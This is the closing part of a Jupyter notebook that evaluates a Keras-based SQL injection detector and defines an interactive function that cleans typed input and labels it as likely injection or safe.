   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.823943661971831"
      ]
     },
     "execution_count": 166,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "from sklearn.metrics import precision_score\n",
    "precision_score(y_test, pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9669421487603306"
      ]
     },
     "execution_count": 167,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from sklearn.metrics import recall_score\n",
    "recall_score(y_test, pred)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Classifying user data\n",
    "\n",
    "     This cell is also in file user_Data_predict.py No need to run this cell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Using TensorFlow backend.\n"
     ]
    }
   ],
   "source": [
    "\n",
    "import keras\n",
    "from keras.models import load_model\n",
    "import pickle\n",
    "\n",
    "mymodel = load_model('my_model_additional_data.h5')\n",
    "myvectorizer = pickle.load(open(\"vectorizer_additional_data\", 'rb'))\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "def clean_data(input_val):\n",
    "\n",
    "    input_val=input_val.replace('\\n', '')\n",
    "    input_val=input_val.replace('%20', ' ')\n",
    "    input_val=input_val.replace('=', ' = ')\n",
    "    input_val=input_val.replace('((', ' (( ')\n",
    "    input_val=input_val.replace('))', ' )) ')\n",
    "    input_val=input_val.replace('(', ' ( ')\n",
    "    input_val=input_val.replace(')', ' ) ')\n",
    "    input_val=input_val.replace('1 ', 'numeric')\n",
    "    input_val=input_val.replace(' 1', 'numeric')\n",
    "    input_val=input_val.replace(\"'1 \", \"'numeric \")\n",
    "    input_val=input_val.replace(\" 1'\", \" numeric'\")\n",
    "    input_val=input_val.replace('1,', 'numeric,')\n",
    "    input_val=input_val.replace(\" 2 \", \" numeric \")\n",
    "    input_val=input_val.replace(' 3 ', ' numeric ')\n",
    "    input_val=input_val.replace(' 3--', ' numeric--')\n",
    "    input_val=input_val.replace(\" 4 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 5 \", ' numeric ')\n",
    "    input_val=input_val.replace(' 6 ', ' numeric ')\n",
    "    input_val=input_val.replace(\" 7 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 8 \", ' numeric ')\n",
    "    input_val=input_val.replace('1234', ' numeric ')\n",
    "    input_val=input_val.replace(\"22\", ' numeric ')\n",
    "    input_val=input_val.replace(\" 8 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 200 \", ' numeric ')\n",
    "    input_val=input_val.replace(\"23 \", ' numeric ')\n",
    "    input_val=input_val.replace('\"1', '\"numeric')\n",
    "    input_val=input_val.replace('1\"', '\"numeric')\n",
    "    input_val=input_val.replace(\"7659\", 'numeric')\n",
    "    input_val=input_val.replace(\" 37 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 45 \", ' numeric ')\n",
    "\n",
    "    return input_val\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "def predict_sqli_attack():\n",
    "    \n",
    "    repeat=True\n",
    "    \n",
    "    beautify=''\n",
    "    for i in range(20):\n",
    "        beautify+= \"=\"\n",
    "\n",
    "    print(beautify) \n",
    "    input_val=input(\"Give me some data to work on : \")\n",
    "    print(beautify)\n",
    "\n",
    "    \n",
    "    if input_val== '0':\n",
    "        repeat=False\n",
    "    \n",
    "    \n",
    "\n",
    "    input_val=clean_data(input_val)\n",
    "    input_val=[input_val]\n",
    "\n",
    "\n",
    "\n",
    "    input_val=myvectorizer.transform(input_val).toarray()\n",
    "\n",
    "    result=mymodel.predict(input_val)\n",
    "\n",
    "\n",
    "    print(beautify)\n",
    "    \n",
    "    \n",
    "    if repeat == True:\n",
    "        \n",
    "        if result>0.5:\n",
    "            print(\"ALERT :::: This can be SQL injection\")\n",
    "\n",
    "\n",
    "        elif result<=0.5:\n",
    "            print(\"It seems to be safe\")\n",
    "            \n",
    "        print(beautify)\n",
    "            \n",
    "        predict_sqli_attack()\n",
    "            \n",
    "    elif repeat == False:\n",
    "        print( \" Good Bye \")\n",
    "\n",
    " \n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# check for sql injection cheat sheet\n",
    "\n",
    "predict_sqli_attack()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
